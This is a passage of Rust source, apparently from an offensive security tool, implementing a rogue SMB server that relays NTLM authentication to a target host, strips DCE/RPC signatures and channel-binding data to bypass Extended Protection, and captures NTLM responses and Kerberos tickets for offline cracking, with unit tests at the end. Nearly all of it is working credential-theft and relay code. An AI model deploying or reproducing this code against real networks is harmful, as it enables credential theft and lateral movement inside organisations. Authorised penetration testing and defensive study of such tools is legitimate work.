    ) -> (u32, Vec<u8>) {
        // Strip DCE/RPC authentication verifier (signature) before forwarding to target.
        // When relaying NTLM through DCE/RPC pipes (MS-RPRN, MS-EFSR, etc.), the signature
        // in the auth verifier becomes invalid if the relay modified the challenge. Stripping
        // it allows the relayed request to succeed even when the target requires RPC auth.
        let cleaned_input = overthrone_core::proto::ntlm::strip_dce_rpc_signature(dce_input);

        let file_id = relay.file_id.unwrap_or([0u8; 16]);
        let body =
            Self::build_ioctl_body(FSCTL_PIPE_TRANSCEIVE, &file_id, &cleaned_input, max_output);
        let pkt = Self::build_relay_request(
            relay.message_id,
            relay.session_id,
            relay.tree_id,
            SMB2_IOCTL,
            &body,
        );
        relay.message_id += 1;
        if relay.stream.write_all(&pkt).await.is_err() {
            return (STATUS_LOGON_FAILURE, vec![]);
        }
        let mut buf = vec![0u8; 65536];
        let n = match relay.stream.read(&mut buf).await {
            Ok(n) => n,
            Err(_) => return (STATUS_LOGON_FAILURE, vec![]),
        };
        let resp = &buf[..n];
        let smb2_start = if resp.len() > 4 && resp[0] == 0x00 {
            4
        } else {
            0
        };
        if resp.len() < smb2_start + SMB2_HEADER_SIZE + 2 {
            return (STATUS_LOGON_FAILURE, vec![]);
        }
        let status = match read_u32_le(&resp[smb2_start..], 8) {
            Some(s) => s,
            None => return (STATUS_LOGON_FAILURE, vec![]),
        };
        let resp_body = if resp.len() > smb2_start + SMB2_HEADER_SIZE {
            resp[smb2_start + SMB2_HEADER_SIZE..].to_vec()
        } else {
            vec![]
        };
        (status, resp_body)
    }

    // ===========================================================
    // Relay: SMB2 request builders for target
    // ===========================================================

    fn build_relay_request(
        msg_id: u64,
        session_id: u64,
        tree_id: u32,
        command: u16,
        body: &[u8],
    ) -> Vec<u8> {
        let total = 4 + SMB2_HEADER_SIZE + body.len();
        let mut pkt = Vec::with_capacity(total);
        // NetBIOS
        let nb_len = (SMB2_HEADER_SIZE + body.len()) as u32;
        pkt.push(0x00);
        pkt.push(((nb_len >> 16) & 0xFF) as u8);
        pkt.push(((nb_len >> 8) & 0xFF) as u8);
        pkt.push((nb_len & 0xFF) as u8);
        // SMB2 header
        pkt.extend_from_slice(SMB2_PROTOCOL);
        pkt.extend_from_slice(&64u16.to_le_bytes());
        pkt.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Status
        pkt.extend_from_slice(&command.to_le_bytes());
        pkt.extend_from_slice(&1u16.to_le_bytes()); // Credits
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Flags
        pkt.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
        pkt.extend_from_slice(&msg_id.to_le_bytes());
        pkt.extend_from_slice(&0u32.to_le_bytes()); // ProcessId
        pkt.extend_from_slice(&tree_id.to_le_bytes());
        pkt.extend_from_slice(&session_id.to_le_bytes());
        pkt.extend_from_slice(&[0u8; 16]); // Signature
        pkt.extend_from_slice(body);
        pkt
    }

    fn build_relay_negotiate(victim_body: &[u8], msg_id: u64) -> Vec<u8> {
        let mut body = if victim_body.len() >= 36 {
            victim_body[..36.min(victim_body.len())].to_vec()
        } else {
            vec![
                36u8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0, 0, 0,
            ]
        };
        if victim_body.len() > 36 {
            body.extend_from_slice(&victim_body[36..]);
        }
        Self::build_relay_request(msg_id, 0, 0, SMB2_NEGOTIATE, &body)
    }

    fn build_relay_session_setup(msg_id: u64, sec_blob: &[u8]) -> Vec<u8> {
        let mut body = Vec::with_capacity(24 + sec_blob.len());
        body.extend_from_slice(&25u16.to_le_bytes()); // StructureSize
        body.push(0x00); // Flags
        body.push(0x00); // SecurityMode
        body.extend_from_slice(&0u16.to_le_bytes()); // Capabilities
        body.extend_from_slice(&0u64.to_le_bytes()); // Channel/Reserved
        let sec_off = 64 + body.len() as u16 + 4;
        body.extend_from_slice(&sec_off.to_le_bytes());
        body.extend_from_slice(&(sec_blob.len() as u16).to_le_bytes());
        body.extend_from_slice(&0u32.to_le_bytes()); // PreviousSessionId
        while body.len() < sec_off as usize - 64 {
            body.push(0);
        }
        body.extend_from_slice(sec_blob);
        Self::build_relay_request(msg_id, 0, 0, SMB2_SESSION_SETUP, &body)
    }

    fn build_tree_connect_body(path: &str) -> Vec<u8> {
        let path_utf16: Vec<u8> = path.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut body = vec![0u8; 8];
        body[0..2].copy_from_slice(&9u16.to_le_bytes()); // StructureSize
        body[2] = 0; // Reserved
        body[3] = 0;
        let off = (64 + body.len() + 2) as u16; // +2 for path offset field itself after alignment
        body.extend_from_slice(&off.to_le_bytes());
        body.extend_from_slice(&(path_utf16.len() as u16).to_le_bytes());
        // Pad to offset
        while body.len() < off as usize - 64 {
            body.push(0);
        }
        body.extend_from_slice(&path_utf16);
        body
    }

    fn build_create_body(pipe_name: &str) -> Vec<u8> {
        // Strip leading \pipe\ or pipe\ if present
        let clean_name = pipe_name
            .trim_start_matches(r"\pipe\")
            .trim_start_matches("pipe\\");
        let name_utf16: Vec<u8> = clean_name
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let mut body = vec![0u8; 64];
        body[0..2].copy_from_slice(&57u16.to_le_bytes()); // StructureSize (0x0039)
        body[2] = 0x00;
        body[3] = 0x00; // SecurityFlags/RequestedOplockLevel
        body[4..8].copy_from_slice(&0x001F_01FFu32.to_le_bytes()); // Impersonation
        body[8..16].fill(0); // SmbCreateFlags/Eight
        body[16..20].copy_from_slice(&0x001F_01FFu32.to_le_bytes()); // DesiredAccess
        body[20..24].fill(0); // FileAttributes
        body[24..28].fill(0); // ShareAccess
        body[28..32].copy_from_slice(&3u32.to_le_bytes()); // CreateDisposition (FILE_OPEN_IF)
        body[32..36].fill(0); // CreateOptions
        let name_off = (64 + body.len() as u32 + 4) as u16; // after alignment
        body[36..38].copy_from_slice(&name_off.to_le_bytes());
        body[38..40].copy_from_slice(&(name_utf16.len() as u16).to_le_bytes());
        // Pad to name offset
        while body.len() < name_off as usize - 64 {
            body.push(0);
        }
        body.extend_from_slice(&name_utf16);
        body
    }

    fn build_ioctl_body(
        ctl_code: u32,
        file_id: &[u8; 16],
        input: &[u8],
        max_output: u32,
    ) -> Vec<u8> {
        let mut body = vec![0u8; 56];
        body[0..2].copy_from_slice(&57u16.to_le_bytes()); // StructureSize
        body[2] = 0;
        body[3] = 0; // Reserved
        body[4..8].copy_from_slice(&ctl_code.to_le_bytes());
        body[8..24].copy_from_slice(file_id);
        let input_off = 64 + body.len() as u32 + 12; // after fixed fields and padding
        body[20..24].copy_from_slice(&input_off.to_le_bytes());
        body[24..28].copy_from_slice(&(input.len() as u32).to_le_bytes());
        body[32..36].copy_from_slice(&0u32.to_le_bytes()); // MaxInputResponse
        body[36..40].copy_from_slice(&max_output.to_le_bytes());
        body[40..44].copy_from_slice(&0u32.to_le_bytes()); // OutputOffset (placeholder)
        body[44..48].copy_from_slice(&0u32.to_le_bytes()); // OutputCount
        body[48..52].copy_from_slice(&0u32.to_le_bytes()); // Flags
        body[52..56].copy_from_slice(&0u32.to_le_bytes()); // Reserved2
        while body.len() < input_off as usize - 64 {
            body.push(0);
        }
        body.extend_from_slice(input);
        body
    }

    // ===========================================================
    // SMB2 Signing
    // ===========================================================

    /// Derive the SMB signing key from the NTLM session key.
    /// For SMB 2.xx: signing_key = session_key (used directly with HMAC-SHA256).
    /// For SMB 3.xx: signing_key = SP800-108 KDF(session_key, "SMBSigningKey\x00", "SmbSign\x00")
    /// Per MS-SMB2 §3.1.4.1: SigningKey = KDF(ExportedSessionKey, Label, Context)
    /// KDF Format: Counter(4B BE) || Label || 0x00 || Context || L(4B BE)
    fn derive_smb_signing_key(
        session_key: &[u8],
        dialect: u16,
        _preauth_salt: &Option<Vec<u8>>,
    ) -> Vec<u8> {
        match dialect {
            SMB2_DIALECT_300 | SMB2_DIALECT_302 | SMB2_DIALECT_311 => {
                // SP800-108 counter mode KDF with HMAC-SHA256
                // Per MS-SMB2: Label = "SMBSigningKey\x00" (null-terminated),
                // Context = "SmbSign\x00" (null-terminated), L = 128 bits
                let mut input = Vec::with_capacity(4 + 15 + 1 + 8 + 4);
                input.extend_from_slice(&1u32.to_be_bytes()); // Counter i=1
                input.extend_from_slice(b"SMBSigningKey\x00"); // Label with null terminator
                input.push(0x00); // SP800-108 separator
                input.extend_from_slice(b"SmbSign\x00"); // Context with null terminator
                input.extend_from_slice(&128u32.to_be_bytes()); // L = 128 bits

                let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(session_key) else {
                    return session_key.to_vec();
                };
                mac.update(&input);
                let result = mac.finalize().into_bytes();
                result[..16].to_vec() // 128-bit signing key
            }
            _ => session_key.to_vec(), // SMB 2.0.2/2.1 uses session key directly
        }
    }

    /// Sign an SMB2 response packet in-place
    fn sign_smb2_response(session: &SmbClientSession, pkt: &mut [u8]) {
        let Some(ref signing_key) = session.signing_key else {
            return;
        };
        if pkt.len() < 4 + SMB2_HEADER_SIZE {
            return;
        }

        // Signature field is at SMB2 header offset 48, after the 4-byte NetBIOS header
        let sig_start = 4 + 48;
        if sig_start + 16 > pkt.len() {
            return;
        }

        // Save original signature, zero it
        let saved = pkt[sig_start..sig_start + 16].to_vec();
        pkt[sig_start..sig_start + 16].fill(0);

        match session.dialect {
            SMB2_DIALECT_202 | SMB2_DIALECT_210 => {
                // SMB 2.x: HMAC-SHA256 truncated to 16 bytes
                let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(signing_key) else {
                    // Fallback: restore saved signature
                    pkt[sig_start..sig_start + 16].copy_from_slice(&saved);
                    return;
                };
                mac.update(pkt);
                let result = mac.finalize().into_bytes();
                pkt[sig_start..sig_start + 16].copy_from_slice(&result[..16]);
            }
            SMB2_DIALECT_300 | SMB2_DIALECT_302 | SMB2_DIALECT_311 => {
                // SMB 3.x: AES-CMAC-128
                let Ok(mut mac) = Cmac::<Aes128>::new_from_slice(signing_key) else {
                    // Fallback: restore saved signature
                    pkt[sig_start..sig_start + 16].copy_from_slice(&saved);
                    return;
                };
                mac.update(pkt);
                let result = mac.finalize().into_bytes();
                pkt[sig_start..sig_start + 16].copy_from_slice(&result);
            }
            _ => {
                pkt[sig_start..sig_start + 16].copy_from_slice(&saved);
            }
        }
    }

    // ===========================================================
    // NTLM / SPNEGO helpers
    // ===========================================================

    fn build_ntlm_challenge(challenge: [u8; 8], target_name: &str) -> Vec<u8> {
        let mut msg = Vec::new();
        msg.extend_from_slice(NTLMSSP_SIGNATURE);
        msg.extend_from_slice(&2u32.to_le_bytes());
        let target_bytes: Vec<u8> = target_name
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes());
        msg.extend_from_slice(&56u32.to_le_bytes());
        let flags: u32 = 0x0000_0202 | 0x0002_0000 | 0x0000_8000 | 0x0000_0004 | 0x0008_0000;
        msg.extend_from_slice(&flags.to_le_bytes());
        msg.extend_from_slice(&challenge);
        msg.extend_from_slice(&[0u8; 8]);
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&target_bytes);
        msg
    }

    fn wrap_spnego_init(ntlmssp: &[u8]) -> Vec<u8> {
        let mut data = Vec::new();
        data.extend_from_slice(&[0x60, 0x00]); // APPLICATION 0 + placeholder len
        data.extend_from_slice(&[0x30, 0x00]); // SEQUENCE + placeholder len
        // MechTypes [0]
        data.extend_from_slice(&[0xa0]);
        let mech_types = Self::build_spnego_mech_types();
        data.extend_from_slice(&Self::asn1_length(mech_types.len()));
        data.extend_from_slice(&mech_types);
        // MechToken [2]
        data.extend_from_slice(&[0xa2]);
        let octet = Self::asn1_octet_string(ntlmssp);
        data.extend_from_slice(&Self::asn1_length(octet.len()));
        data.extend_from_slice(&octet);
        // Fix lengths
        data[3] = (data.len() - 4) as u8;
        data[1] = (data.len() - 2) as u8;
        data
    }

    fn build_spnego_mech_types() -> Vec<u8> {
        let mut data = vec![0x30]; // SEQUENCE
        let oid_encoded = Self::asn1_oid(&[
            0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a,
        ]);
        data.extend_from_slice(&Self::asn1_length(oid_encoded.len()));
        data.extend_from_slice(&oid_encoded);
        data
    }

    fn wrap_spnego_response(ntlmssp: &[u8]) -> Vec<u8> {
        let mut data = Vec::new();
        data.extend_from_slice(&[0xa1, 0x00]); // CONTEXT [1] + placeholder len
        data.extend_from_slice(&[0x30, 0x00]); // SEQUENCE + placeholder len
        data.extend_from_slice(&[0xa2]); // ResponseToken [2]
        let octet = Self::asn1_octet_string(ntlmssp);
        data.extend_from_slice(&Self::asn1_length(octet.len()));
        data.extend_from_slice(&octet);
        data[3] = (data.len() - 4) as u8;
        data[1] = (data.len() - 2) as u8;
        data
    }

    fn extract_ntlmssp(data: &[u8]) -> Vec<u8> {
        Self::find_subsequence(data, NTLMSSP_SIGNATURE)
            .map(|pos| data[pos..].to_vec())
            .unwrap_or_default()
    }

    fn extract_ntlmssp_from_smb2_session_setup(victim_data: &[u8]) -> Vec<u8> {
        Self::extract_ntlmssp(victim_data)
    }

    fn find_subsequence(data: &[u8], needle: &[u8]) -> Option<usize> {
        if needle.is_empty() || data.len() < needle.len() {
            return None;
        }
        for i in 0..=data.len() - needle.len() {
            if &data[i..i + needle.len()] == needle {
                return Some(i);
            }
        }
        None
    }

    fn asn1_length(len: usize) -> Vec<u8> {
        if len < 128 {
            vec![len as u8]
        } else if len < 256 {
            vec![0x81, len as u8]
        } else if len < 65536 {
            vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
        } else {
            vec![
                0x83,
                (len >> 16) as u8,
                (len >> 8) as u8,
                (len & 0xFF) as u8,
            ]
        }
    }

    fn asn1_octet_string(data: &[u8]) -> Vec<u8> {
        let mut out = vec![0x04];
        out.extend_from_slice(&Self::asn1_length(data.len()));
        out.extend_from_slice(data);
        out
    }

    fn asn1_oid(oid_bytes: &[u8]) -> Vec<u8> {
        let mut out = vec![0x06];
        out.extend_from_slice(&Self::asn1_length(oid_bytes.len()));
        out.extend_from_slice(oid_bytes);
        out
    }

    /// Strip the MsvAvChannelBindings AV_PAIR from an NTLM Type 2 challenge.
    /// This is the EPA bypass (CVE-2024-21410 style).
    fn strip_channel_bindings_from_challenge(challenge: &[u8]) -> Vec<u8> {
        if challenge.len() < 48 {
            return challenge.to_vec();
        }
        // NTLM Type 2: TargetInfo (AV_PAIRS) starts at offset 48 (variable)
        // Offset 12: TargetInfoLen (2 bytes)
        // Offset 16: TargetInfoOffset (4 bytes)
        let ti_len = u16::from_le_bytes([challenge[12], challenge[13]]) as usize;
        let ti_off =
            u32::from_le_bytes([challenge[16], challenge[17], challenge[18], challenge[19]])
                as usize;
        if ti_len == 0 || ti_off == 0 || ti_off + ti_len > challenge.len() {
            return challenge.to_vec();
        }
        let ti_end = ti_off + ti_len;
        let target_info = &challenge[ti_off..ti_end];
        let mut cleaned = Vec::with_capacity(ti_len);
        let mut i = 0;
        while i + 4 <= target_info.len() {
            let av_id = u16::from_le_bytes([target_info[i], target_info[i + 1]]);
            let av_len = u16::from_le_bytes([target_info[i + 2], target_info[i + 3]]) as usize;
            if av_id == 3 {
                // MsvAvChannelBindings -- skip this AV_PAIR
                // Also skip the terminating MsvAvEOL (0, 0) that might be after
                i += 4 + av_len;
                continue;
            }
            cleaned.extend_from_slice(&target_info[i..i + 4 + av_len]);
            i += 4 + av_len;
            if av_id == 0 {
                break;
            } // MsvAvEOL
        }
        // Ensure MsvAvEOL terminating pair
        if cleaned.len() < 4 || cleaned[cleaned.len() - 4..cleaned.len()] != [0u8; 4] {
            cleaned.extend_from_slice(&[0u8; 4]);
        }
        let mut result = challenge.to_vec();
        let new_ti_len = cleaned.len() as u16;
        result[12..14].copy_from_slice(&new_ti_len.to_le_bytes());
        // Rebuild the target info in place
        if ti_off + ti_len <= result.len() {
            let new_end = ti_off + cleaned.len();
            if new_end <= result.len() {
                result[ti_off..ti_off + cleaned.len()].copy_from_slice(&cleaned);
                // Zero out remaining
                if ti_off + cleaned.len() < ti_end {
                    result[ti_off + cleaned.len()..ti_end].fill(0);
                }
            }
        }
        result
    }

    /// Extract session key from an NTLM Type 2 challenge's KeyExchange field
    fn extract_session_key_from_challenge(_challenge: &[u8]) -> Vec<u8> {
        // In a relay response, the session key is sometimes embedded in the KeyList or
        // returned as part of the SMB2 session setup response.
        // This is a best-effort extract; the actual key comes from the target's
        // successful session setup response's security buffer.
        // For SMB relay, the session key is NOT in the challenge itself.
        Vec::new()
    }

    // ===========================================================
    // Session key derivation
    // ===========================================================

    /// Attempt to derive the session key from an NTLM Type 3 message.
    /// Without the NT hash this is impossible -- returns None in capture mode.
    /// In relay mode, the session key is extracted from the target's response instead.
    fn derive_session_key(_ntlmssp: &[u8]) -> Option<Vec<u8>> {
        // Without the user's NT hash, we cannot compute the session key.
        // The session key for NTLMv2 is: HMAC-MD4(MD4(NT-Hash), NTLMv2-Proof + Blob)
        // We don't have the NT hash in capture mode.
        // In relay mode, the session key comes from the target's response.
        None
    }

    // ===========================================================
    // Credential capture
    // ===========================================================

    /// krbrelayx parity: parse a Kerberos AP-REQ from the session-setup
    /// security buffer and record the embedded ticket.
    fn capture_kerberos_apreq(
        sec_data: &[u8],
        tickets: &Arc<Mutex<Vec<CapturedKerberosTicket>>>,
        client_ip: &str,
    ) -> Option<()> {
        let apreq = crate::krb_capture::parse_ap_req(sec_data).ok()?;
        let ticket = &apreq.ticket;
        let kirbi = crate::krb_capture::build_kirbi(
            &ticket.ticket_blob,
            &ticket.realm,
            &ticket.sname,
            ticket.name_type,
            None,
            &[],
            None,
            0,
        );
        let is_tgt = ticket
            .sname
            .first()
            .map(|s| s.eq_ignore_ascii_case("krbtgt"))
            .unwrap_or(false);
        info!(
            "Kerberos capture: {} ticket {}@{} (etype {}, kvno {}) from {} -- .kirbi ready for offline decryption",
            if is_tgt { "TGT" } else { "service" },
            ticket.sname.join("/"),
            ticket.realm,
            ticket.etype,
            ticket.kvno,
            client_ip
        );
        let cap = CapturedKerberosTicket {
            source: client_ip.to_string(),
            apreq_raw: sec_data.to_vec(),
            ticket_blob: ticket.ticket_blob.clone(),
            realm: ticket.realm.clone(),
            sname: ticket.sname.clone(),
            name_type: ticket.name_type,
            etype: ticket.etype,
            kvno: ticket.kvno,
            cipher: ticket.cipher.clone(),
            kirbi,
        };
        tickets.lock().unwrap_or_else(|e| e.into_inner()).push(cap);
        Some(())
    }

    fn capture_ntlm_credentials(
        ntlmssp: &[u8],
        server_challenge: [u8; 8],
        captured: &Arc<Mutex<Vec<CapturedCredential>>>,
        client_ip: &str,
    ) {
        if ntlmssp.len() < 64 {
            return;
        }
        let field = |offset: usize| -> String {
            let len = u16::from_le_bytes([ntlmssp[offset], ntlmssp[offset + 1]]) as usize;
            let buf_off = match read_u32_le(ntlmssp, offset + 4) {
                Some(off) => off as usize,
                None => return String::new(),
            };
            if len > 0 && buf_off + len <= ntlmssp.len() {
                let bytes = &ntlmssp[buf_off..buf_off + len];
                String::from_utf16_lossy(
                    &bytes
                        .as_chunks::<2>()
                        .0
                        .iter()
                        .map(|c| u16::from_le_bytes([c[0], c[1]]))
                        .collect::<Vec<_>>(),
                )
            } else {
                String::new()
            }
        };
        let domain = field(28);
        let username = field(36);

        let lm_len = u16::from_le_bytes([ntlmssp[12], ntlmssp[13]]) as usize;
        let lm_off = match read_u32_le(ntlmssp, 16) {
            Some(off) => off as usize,
            None => return,
        };
        let lm_response = if lm_len > 0 && lm_off + lm_len <= ntlmssp.len() {
            hex::encode(&ntlmssp[lm_off..lm_off + lm_len])
        } else {
            String::new()
        };

        let nt_len = u16::from_le_bytes([ntlmssp[20], ntlmssp[21]]) as usize;
        let nt_off = match read_u32_le(ntlmssp, 24) {
            Some(off) => off as usize,
            None => return,
        };
        let nt_response = if nt_len > 0 && nt_off + nt_len <= ntlmssp.len() {
            hex::encode(&ntlmssp[nt_off..nt_off + nt_len])
        } else {
            String::new()
        };

        let cred = CapturedCredential {
            client_ip: client_ip.to_string(),
            username,
            domain,
            challenge: hex::encode(server_challenge),
            lm_response,
            nt_response,
            protocol: "SMB2".to_string(),
            timestamp: chrono::Utc::now(),
        };
        if !cred.username.is_empty() {
            info!(
                "Captured NTLM credentials: {}\\{} from {}",
                cred.domain, cred.username, client_ip
            );
            if let Ok(mut guard) = captured.lock() {
                guard.push(cred);
            }
        }
    }

    // ===========================================================
    // Protocol helpers
    // ===========================================================

    fn build_full_message_for_hash(body: &[u8]) -> Vec<u8> {
        let mut msg = Vec::with_capacity(SMB2_HEADER_SIZE + body.len());
        msg.extend_from_slice(SMB2_PROTOCOL);
        msg.extend_from_slice(&64u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&1u16.to_le_bytes());
        msg.extend_from_slice(&SMB2_FLAGS_SERVER_TO_REDIR.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u64.to_le_bytes());
        msg.extend_from_slice(&0u64.to_le_bytes());
        msg.extend_from_slice(&[0u8; 16]);
        msg.extend_from_slice(body);
        msg
    }

    fn build_response_header(
        command: u16,
        status: u32,
        message_id: u64,
        session_id: u64,
        tree_id: u32,
        body: &[u8],
    ) -> Vec<u8> {
        let total_size = SMB2_HEADER_SIZE + body.len() + 4;
        let mut pkt = Vec::with_capacity(total_size);
        let nb_len = (SMB2_HEADER_SIZE + body.len()) as u32;
        pkt.push(0x00);
        pkt.push(((nb_len >> 16) & 0xFF) as u8);
        pkt.push(((nb_len >> 8) & 0xFF) as u8);
        pkt.push((nb_len & 0xFF) as u8);
        pkt.extend_from_slice(SMB2_PROTOCOL);
        pkt.extend_from_slice(&64u16.to_le_bytes());
        pkt.extend_from_slice(&0u16.to_le_bytes());
        pkt.extend_from_slice(&status.to_le_bytes());
        pkt.extend_from_slice(&command.to_le_bytes());
        pkt.extend_from_slice(&1u16.to_le_bytes());
        pkt.extend_from_slice(&SMB2_FLAGS_SERVER_TO_REDIR.to_le_bytes());
        pkt.extend_from_slice(&0u32.to_le_bytes());
        pkt.extend_from_slice(&message_id.to_le_bytes());
        pkt.extend_from_slice(&0u32.to_le_bytes());
        pkt.extend_from_slice(&tree_id.to_le_bytes());
        pkt.extend_from_slice(&session_id.to_le_bytes());
        pkt.extend_from_slice(&[0u8; 16]);
        pkt.extend_from_slice(body);
        pkt
    }

    fn filetime_now() -> u64 {
        systemtime_to_filetime(std::time::SystemTime::now())
    }

    fn build_smb1_negotiate_response(challenge: [u8; 8], _target_name: &str) -> Vec<u8> {
        let mut resp = vec![0x00]; // NetBIOS
        resp.extend_from_slice(b"\xffSMB");
        resp.push(0x72);
        resp.push(0x00);
        resp.push(0x00);
        resp.extend_from_slice(&0u16.to_le_bytes());
        resp.extend_from_slice(&[0u8; 18]);
        resp.extend_from_slice(&0x0Fu16.to_le_bytes());
        resp.push(0x01);
        resp.extend_from_slice(&1u16.to_le_bytes());
        resp.extend_from_slice(&1u16.to_le_bytes());
        resp.extend_from_slice(&65535u32.to_le_bytes());
        resp.extend_from_slice(&65536u32.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        resp.extend_from_slice(&0x0000_0080u32.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        resp.extend_from_slice(&0i16.to_le_bytes());
        resp.push(8u8);
        resp.extend_from_slice(&challenge);
        let nb_len = resp.len() - 4;
        resp[1] = ((nb_len >> 16) & 0xFF) as u8;
        resp[2] = ((nb_len >> 8) & 0xFF) as u8;
        resp[3] = (nb_len & 0xFF) as u8;
        resp
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::{Arc, Mutex};

    #[test]
    fn smb_daemon_config_defaults() {
        let cfg = SmbDaemonConfig::default();
        assert_eq!(cfg.listen_ip, "::");
        assert_eq!(cfg.listen_port, 445);
        assert!(cfg.challenge.is_none());
        assert!(matches!(cfg.mode, SmbDaemonMode::Capture));
        assert_eq!(cfg.domain_name, "LAN");
        assert!(cfg.socks5_proxy.is_none());
    }

    #[test]
    fn build_ntlm_challenge_has_correct_signature_and_type() {
        let challenge = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
        let msg = SmbDaemon::build_ntlm_challenge(challenge, "WORKGROUP");
        assert!(msg.starts_with(b"NTLMSSP\0"));
        assert_eq!(u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]), 2);
        assert_eq!(&msg[24..32], &challenge[..]);
    }

    #[test]
    fn wrap_spnego_init_contains_ntlm_token() {
        let ntlm = b"NTLMSSP\x00\x02";
        let spnego = SmbDaemon::wrap_spnego_init(ntlm);
        assert!(spnego.windows(ntlm.len()).any(|w| w == ntlm));
    }

    #[test]
    fn wrap_spnego_response_contains_token() {
        let token = b"\x4e\x54\x4c\x4d";
        let spnego = SmbDaemon::wrap_spnego_response(token);
        assert!(spnego.windows(token.len()).any(|w| w == token));
    }

    #[test]
    fn build_response_header_has_netbios_prefix_and_smb_signature() {
        let body = vec![0xAB, 0xCD];
        let pkt =
            SmbDaemon::build_response_header(SMB2_SESSION_SETUP, STATUS_SUCCESS, 1, 2, 3, &body);
        assert_eq!(pkt[0], 0x00);
        let nb_len = u32::from_be_bytes([0, pkt[1], pkt[2], pkt[3]]) as usize;
        assert_eq!(nb_len, SMB2_HEADER_SIZE + body.len());
        assert_eq!(&pkt[4..8], SMB2_PROTOCOL);
        assert_eq!(u16::from_le_bytes([pkt[8], pkt[9]]), 64);
        assert_eq!(
            u32::from_le_bytes([pkt[12], pkt[13], pkt[14], pkt[15]]),
            STATUS_SUCCESS
        );
        assert_eq!(u16::from_le_bytes([pkt[16], pkt[17]]), SMB2_SESSION_SETUP);
    }

    #[test]
    fn capture_ntlm_credentials_parses_type3_message() {
        let server_challenge = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        let domain = "SEVENKINGDOMS";
        let username = "vagrant";
        let lm_resp = vec![0xAA; 24];
        let nt_resp = vec![0xBB; 24];

        let domain_utf16: Vec<u8> = domain.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let username_utf16: Vec<u8> = username.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let workstation_utf16: Vec<u8> = "WORKSTATION"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();

        let mut msg = Vec::new();
        msg.extend_from_slice(b"NTLMSSP\0");
        msg.extend_from_slice(&3u32.to_le_bytes());

        let lm_offset = 64;
        msg.extend_from_slice(&(lm_resp.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(lm_resp.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(lm_offset as u32).to_le_bytes());

        let nt_offset = lm_offset + lm_resp.len();
        msg.extend_from_slice(&(nt_resp.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(nt_resp.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(nt_offset as u32).to_le_bytes());

        let domain_offset = nt_offset + nt_resp.len();
        msg.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(domain_offset as u32).to_le_bytes());

        let user_offset = domain_offset + domain_utf16.len();
        msg.extend_from_slice(&(username_utf16.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(username_utf16.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(user_offset as u32).to_le_bytes());

        let ws_offset = user_offset + username_utf16.len();
        msg.extend_from_slice(&(workstation_utf16.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(workstation_utf16.len() as u16).to_le_bytes());
        msg.extend_from_slice(&(ws_offset as u32).to_le_bytes());

        msg.extend_from_slice(&[0u8; 8]); // session key placeholder
        msg.extend_from_slice(&0x88205u32.to_le_bytes()); // flags

        msg.extend_from_slice(&lm_resp);
        msg.extend_from_slice(&nt_resp);
        msg.extend_from_slice(&domain_utf16);
        msg.extend_from_slice(&username_utf16);
        msg.extend_from_slice(&workstation_utf16);

        let captured = Arc::new(Mutex::new(Vec::new()));
        SmbDaemon::capture_ntlm_credentials(&msg, server_challenge, &captured, "192.168.57.99");

        let guard = captured.lock().unwrap();
        assert_eq!(guard.len(), 1);
        assert_eq!(guard[0].username, username);
        assert_eq!(guard[0].domain, domain);
        assert_eq!(guard[0].lm_response, hex::encode(&lm_resp));
        assert_eq!(guard[0].nt_response, hex::encode(&nt_resp));
        assert_eq!(guard[0].challenge, hex::encode(server_challenge));
        assert_eq!(guard[0].protocol, "SMB2");
        assert_eq!(guard[0].client_ip, "192.168.57.99");
    }

    #[test]
    fn filetime_now_is_monotonic_and_reasonable() {
        let a = SmbDaemon::filetime_now();
        std::thread::sleep(std::time::Duration::from_millis(5));
        let b = SmbDaemon::filetime_now();
        assert!(b > a);
        // Windows FILETIME for 2020+ is well above 0x01D4F0B0EBC00000
        assert!(a > 0x01D4_F0B0_EBC0_0000);
    }

    #[test]
    fn systemtime_to_filetime_matches_epoch_offset() {
        // 1970-01-01 == 11644473600_0000000 FILETIME
        assert_eq!(
            systemtime_to_filetime(std::time::UNIX_EPOCH),
            116_444_736_000_000_000
        );
